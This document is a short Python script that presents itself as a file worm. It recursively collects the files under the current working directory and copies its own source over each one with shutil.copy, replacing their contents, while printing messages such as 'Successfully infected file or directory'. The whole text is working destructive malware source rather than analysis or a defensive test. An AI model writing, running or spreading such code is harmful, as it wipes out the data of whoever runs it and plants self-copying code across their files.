import os
import sys
import shutil
import time

directories = []
filename = sys.argv[0]

# Beginning worm_drive function.
def filtering_and_expanding(path):
    for sub_dirs in os.listdir(path):
        if not sub_dirs.startswith('.') \
                and not sub_dirs.startswith(str(filename)) \
                and not sub_dirs.startswith('smbmap') \
                and not sub_dirs.startswith('venv'):
            directories.append(path + '/' + sub_dirs)


def copies(path):
    try:
        destination = path
        shutil.copy(filename, destination)
    except Exception as e:
        print(e)


filtering_and_expanding(os.getcwd())


def initialiting():
    for i in directories:
        if os.path.isdir(i):
            available_directories = i
            filtering_and_expanding(available_directories)
        if os.path.isfile(i):
            copies(i)


def worm_spreading():
    initialiting()
    for i in directories:
        try:
            print('[+] Successfully infected file or directory: ' + i)
            time.sleep(1)
        except Exception as e:
            print('[-] file infection failed on ' + i + " reason is " + str(e))
            time.sleep(1)

# End of worm-drive function.
